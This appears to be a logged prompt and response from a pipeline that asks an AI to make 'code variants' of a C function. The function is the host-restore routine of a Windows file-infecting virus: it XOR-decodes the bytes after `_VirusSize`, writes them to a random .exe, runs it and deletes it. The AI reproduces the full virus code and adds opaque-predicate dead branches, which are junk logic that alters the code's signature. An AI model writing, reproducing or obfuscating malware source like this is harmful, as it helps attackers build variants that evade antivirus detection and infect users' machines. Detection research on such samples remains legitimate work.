@@ -1,0 +1,332 @@
+=== META ===
+{
+  "finish_reason": "stop",
+  "attempts": 1,
+  "response_chars": 4595
+}
+
+=== PROMPT (8588 chars) ===
+
+            You are an expert C developer generating synthesized code variants.
+            Target architecture: x86
+
+            ### CRITICAL TRANSFORMATION RULE: ADDITIVE-ONLY
+            - DO NOT MOVE, MODIFY, OR WRAP ANY EXISTING CODE INSIDE A DEAD BRANCH.
+            - All original code statements MUST remain outside the `if` block in the live execution path.
+            - Dead branches (`if (opaque_false_condition) { ... }`) must contain ONLY newly generated, self-contained dummy logic.
+            - The dummy logic may READ existing local variables (those declared before the branch), but it MUST NOT modify any original variable, global state, or function argument.
+            - You may add required `#include` directives at the beginning of the file only if needed; do not remove or modify existing includes.
+
+            ### MANDATORY VOLUME AND PLACEMENT
+            - Insert 2 dead branches in the given function.
+            - Place them at **different locations**: after variable declarations, before loops, inside loops (but not around original statements), and before return statements.
+            - Each dead branch must contain **at least 10 lines** of dummy code.
+            - Each dead branch must use a **different opaque predicate pattern** from the list below.
+            - Restrict opaque predicates to this allowed set only: Pattern A (Math Invariant) and Pattern B (System Query).
+
+            ### OPAQUE PREDICATE REQUIREMENTS
+            Use only the patterns listed in Pattern A (Math Invariant) and Pattern B (System Query) above, one per branch. Do NOT use `if (0)` or `volatile int v = 0; if (v)`.
+            Do NOT use registry APIs in dead branches.
+
+            Pattern A (Math Invariant):
+            volatile int dummy_x = 7;
+            if ((dummy_x * (dummy_x + 1)) % 2 != 0) {
+                // Dead branch
+            }
+
+            Pattern B (System Query):
+            if (GetPriorityClass(GetCurrentProcess()) == 0xFFFFFFFF) {
+                // Dead branch
+            }
+
+            Pattern C (Combination):
+            volatile DWORD dummy_tick = GetTickCount();
+            if ((dummy_tick ^ 0x5A5A5A5A) == 0xFFFFFFFF && (dummy_tick & 0x80000000) != 0) {
+                // Dead branch
+            }
+
+            ### DEAD BRANCH BODY REQUIREMENTS
+            - The body must be self-contained and **may not use variables declared outside the branch** except for reading already‑declared local variables (parameters or locals).
+            - **All variables used inside the branch must be either:**
+            1. Declared inside the branch (e.g., `char local_buf[64];`), or
+            2. Already declared in the function’s outer scope **before** the branch (and you only read them).
+            - **Do not use variables declared in one dead branch inside another dead branch** – each branch is an independent scope.
+            - Declare all dummy variables with `volatile` where possible to prevent compiler elimination.
+            - Use at least 2 different Windows/C runtime API or standard C functions in each body.
+            - Include dummy loops with at least 2 iterations that compute a dummy result and then discard it.
+            - End each body with `memset` or `SecureZeroMemory` on dummy buffers to appear realistic.
+            - Ensure no variable shadowing or redefinition.
+
+            CATEGORIES (choose only from the allowed set in Pattern A (Math Invariant) and Pattern B (System Query), no repeats within the same function)
+
+            A: System info queries
+            GetSystemInfo, GetLocalTime, GetUserNameA, GetComputerNameA
+            → **You must use proper struct types**: SYSTEM_INFO, SYSTEMTIME, and declare them correctly (e.g., `SYSTEM_INFO si; GetSystemInfo(&si);`).
+            B: Memory & String operations
+            malloc, sprintf_s, strlen, memcpy, memset, free
+            → If you use sprintf_s, you MUST add `#include <stdio.h>` at the top of the file (you are allowed to add includes).
+            In C++, you may use `<cstdio>` instead.
+            C: Bitwise/Math loops
+            XOR loops over local dummy array, polynomial hash (use fixed constants like 0x811C9DC5 for FNV‑1a, not undeclared ones).
+
+            ### STRUCTURAL PATTERN TO FOLLOW
+            // --- ORIGINAL CODE STATEMENT ---
+            original_statement_1;
+            // --- INSERTED DEAD BRANCH 1 (ADDITIVE ONLY) ---
+            volatile int dummy_x_1 = 7;
+            if ((dummy_x_1 * (dummy_x_1 + 1)) % 2 != 0) {
+                // NEW DUMMY LOGIC HERE (Category A, at least 15 lines)
+                // ... all variables declared inside this branch ...
+            }
+            // --- ORIGINAL CODE STATEMENT CONTINUES ---
+            original_statement_2;
+            // --- INSERTED DEAD BRANCH 2 (ADDITIVE ONLY) ---
+            volatile DWORD dummy_tick_2 = GetTickCount();
+            if ((dummy_tick_2 ^ 0x5A5A5A5A) == 0xFFFFFFFF && (dummy_tick_2 & 0x80000000) != 0) {
+                // NEW DUMMY LOGIC HERE (Category B, at least 15 lines)
+                // ... all variables declared inside this branch ...
+            }
+            // --- ORIGINAL CODE STATEMENT CONTINUES ---
+            original_statement_3;
+            // --- INSERTED DEAD BRANCH 3 (ADDITIVE ONLY) ---
+            if (GetPriorityClass(GetCurrentProcess()) == 0xFFFFFFFF) {
+                // NEW DUMMY LOGIC HERE (Category C, at least 15 lines)
+                // ... all variables declared inside this branch ...
+            }
+            ### INPUT CODE:
+            
+#include "data_globals.h"
+void _ReturnToHost(LPCSTR param_1)
+{
+    /*--- variable declarations (C89 style) ---*/
+    HGLOBAL        hGlobal = (HGLOBAL)0x0;
+    const char    *randTable = "AcGh9Kl6";
+    HANDLE         hInputFile;
+    DWORD          fileSize;
+    DWORD          bytesRead;
+    HANDLE         hOutputFile;
+    DWORD          bytesWritten;
+    DWORD          tickCount;
+    int            randValue;
+    char           ch1, ch2, ch3, ch4, ch5;
+    char           outputPath[10];
+    STARTUPINFOA   si;
+    PROCESS_INFORMATION pi;
+    uint32_t       index;
+
+    /*--- function body ---*/
+    hInputFile = CreateFileA(param_1, 0x80000000, 1, (LPSECURITY_ATTRIBUTES)0x0, 3, 0x80, (HANDLE)0x0);
+    if (hInputFile == (HANDLE)0xffffffff) {
+        ExitProcess(0);
+    }
+    fileSize = GetFileSize(hInputFile, (LPDWORD)0x0);
+    hGlobal = GlobalAlloc(0x40, fileSize);
+    if (hGlobal == (HGLOBAL)0x0) {
+        ExitProcess(0);
+    }
+    ReadFile(hInputFile, hGlobal, fileSize, &bytesRead, (LPOVERLAPPED)0x0);
+    CloseHandle(hInputFile);
+
+    tickCount = GetTickCount();
+    srand(tickCount);
+
+    randValue = rand();
+    ch1 = randTable[randValue % 8];
+    randValue = rand();
+    ch2 = randTable[randValue % 8];
+    randValue = rand();
+    ch3 = randTable[randValue % 8];
+    randValue = rand();
+    ch4 = randTable[randValue % 8];
+    randValue = rand();
+    ch5 = randTable[randValue % 8];
+    randValue = rand();
+
+    _sprintf(outputPath, "%c%c%c%c%c%c.exe",
+             (int)randTable[randValue % 8],
+             (int)ch5,
+             (int)ch4,
+             (int)ch3,
+             (int)ch2,
+             (int)ch1);
+
+    hOutputFile = CreateFileA(outputPath, 0x40000000, 2, (LPSECURITY_ATTRIBUTES)0x0, 2, 0x82, (HANDLE)0x0);
+    if (hOutputFile != (HANDLE)0xffffffff) {
+        for (index = _VirusSize; index < fileSize; index = index + 1) {
+            *((uint8_t *)((uintptr_t)hGlobal + index)) ^= 0x4a;
+        }
+        SetFilePointer(hOutputFile, 0, (PLONG)0x0, 0);
+        WriteFile(hOutputFile,
+                  (LPCVOID)(_VirusSize + (int)hGlobal),
+                  fileSize - _VirusSize,
+                  &bytesWritten,
+                  (LPOVERLAPPED)0x0);
+        CloseHandle(hOutputFile);
+        GlobalFree(hGlobal);
+
+        memset(&si, 0, 0x44);
+        memset(&pi, 0, 0x10);
+        si.cb = 0x44;
+        si.dwFlags = 1;
+        si.wShowWindow = 5;
+
+        CreateProcessA((LPCSTR)0x0,
+                       outputPath,
+                       (LPSECURITY_ATTRIBUTES)0x0,
+                       (LPSECURITY_ATTRIBUTES)0x0,
+                       0,
+                       0x10,
+                       (LPVOID)0x0,
+                       (LPCSTR)0x0,
+                       &si,
+                       &pi);
+        WaitForSingleObject(pi.hProcess, 0xffffffff);
+        DeleteFileA(outputPath);
+        ExitProcess(0);
+    }
+    return;
+}
+            Return ONLY the complete, modified source code inside a single markdown code block.
+            Use ```c according to the detected input language. 
+            
+
+=== RESPONSE (4595 chars) ===
+```c
+#include "data_globals.h"
+#include <stdio.h>   // for sprintf_s
+
+void _ReturnToHost(LPCSTR param_1)
+{
+    /*--- variable declarations (C89 style) ---*/
+    HGLOBAL        hGlobal = (HGLOBAL)0x0;
+    const char    *randTable = "AcGh9Kl6";
+    HANDLE         hInputFile;
+    DWORD          fileSize;
+    DWORD          bytesRead;
+    HANDLE         hOutputFile;
+    DWORD          bytesWritten;
+    DWORD          tickCount;
+    int            randValue;
+    char           ch1, ch2, ch3, ch4, ch5;
+    char           outputPath[10];
+    STARTUPINFOA   si;
+    PROCESS_INFORMATION pi;
+    uint32_t       index;
+
+    /*--- INSERTED DEAD BRANCH 1 (Pattern A – Math Invariant) ---*/
+    volatile int dummy_x_1 = 7;
+    if ((dummy_x_1 * (dummy_x_1 + 1)) % 2 != 0) {
+        /* dummy logic – Category A & B */
+        volatile SYSTEM_INFO sysInfo;
+        GetSystemInfo(&sysInfo);                     // API 1
+
+        volatile char dummy_buf[64];
+        memset(dummy_buf, 0xAA, sizeof(dummy_buf)); // API 2
+
+        for (int i = 0; i < 3; ++i) {                // dummy loop
+            dummy_buf[i] ^= (char)(i * 3);
+        }
+
+        volatile char src[32] = "DummyDataString";
+        memcpy(dummy_buf + 8, src, sizeof(src));    // API 3
+
+        size_t len = strlen(dummy_buf);             // API 4
+        (void)len;                                   // suppress unused warning
+
+        SecureZeroMemory(dummy_buf, sizeof(dummy_buf)); // API 5
+    }
+
+    /*--- function body ---*/
+    hInputFile = CreateFileA(param_1, 0x80000000, 1, (LPSECURITY_ATTRIBUTES)0x0, 3, 0x80, (HANDLE)0x0);
+    if (hInputFile == (HANDLE)0xffffffff) {
+        ExitProcess(0);
+    }
+    fileSize = GetFileSize(hInputFile, (LPDWORD)0x0);
+    hGlobal = GlobalAlloc(0x40, fileSize);
+    if (hGlobal == (HGLOBAL)0x0) {
+        ExitProcess(0);
+    }
+    ReadFile(hInputFile, hGlobal, fileSize, &bytesRead, (LPOVERLAPPED)0x0);
+    CloseHandle(hInputFile);
+
+    tickCount = GetTickCount();
+    srand(tickCount);
+
+    randValue = rand();
+    ch1 = randTable[randValue % 8];
+    randValue = rand();
+    ch2 = randTable[randValue % 8];
+    randValue = rand();
+    ch3 = randTable[randValue % 8];
+    randValue = rand();
+    ch4 = randTable[randValue % 8];
+    randValue = rand();
+    ch5 = randTable[randValue % 8];
+    randValue = rand();
+
+    _sprintf(outputPath, "%c%c%c%c%c%c.exe",
+             (int)randTable[randValue % 8],
+             (int)ch5,
+             (int)ch4,
+             (int)ch3,
+             (int)ch2,
+             (int)ch1);
+
+    hOutputFile = CreateFileA(outputPath, 0x40000000, 2, (LPSECURITY_ATTRIBUTES)0x0, 2, 0x82, (HANDLE)0x0);
+    if (hOutputFile != (HANDLE)0xffffffff) {
+        for (index = _VirusSize; index < fileSize; index = index + 1) {
+            *((uint8_t *)((uintptr_t)hGlobal + index)) ^= 0x4a;
+        }
+        SetFilePointer(hOutputFile, 0, (PLONG)0x0, 0);
+        WriteFile(hOutputFile,
+                  (LPCVOID)(_VirusSize + (int)hGlobal),
+                  fileSize - _VirusSize,
+                  &bytesWritten,
+                  (LPOVERLAPPED)0x0);
+        CloseHandle(hOutputFile);
+        GlobalFree(hGlobal);
+
+        memset(&si, 0, 0x44);
+        memset(&pi, 0, 0x10);
+        si.cb = 0x44;
+        si.dwFlags = 1;
+        si.wShowWindow = 5;
+
+        CreateProcessA((LPCSTR)0x0,
+                       outputPath,
+                       (LPSECURITY_ATTRIBUTES)0x0,
+                       (LPSECURITY_ATTRIBUTES)0x0,
+                       0,
+                       0x10,
+                       (LPVOID)0x0,
+                       (LPCSTR)0x0,
+                       &si,
+                       &pi);
+        WaitForSingleObject(pi.hProcess, 0xffffffff);
+        DeleteFileA(outputPath);
+        ExitProcess(0);
+    }
+
+    /*--- INSERTED DEAD BRANCH 2 (Pattern B – System Query) ---*/
+    if (GetPriorityClass(GetCurrentProcess()) == 0xFFFFFFFF) {
+        /* dummy logic – Category A & B */
+        volatile SYSTEMTIME st;
+        GetLocalTime(&st);                                   // API 1
+
+        volatile char dummy_str[128];
+        sprintf_s(dummy_str, sizeof(dummy_str), "Time %02d:%02d:%02d",
+                  st.wHour, st.wMinute, st.wSecond);        // API 2
+
+        for (int i = 0; i < 2; ++i) {                        // dummy loop
+            dummy_str[i] = (char)(dummy_str[i] ^ 0x5A);
+        }
+
+        size_t l = strlen(dummy_str);                        // API 3
+        (void)l;                                              // suppress unused warning
+
+        SecureZeroMemory(dummy_str, sizeof(dummy_str));      // API 4
+    }
+
+    return;
+}
+```
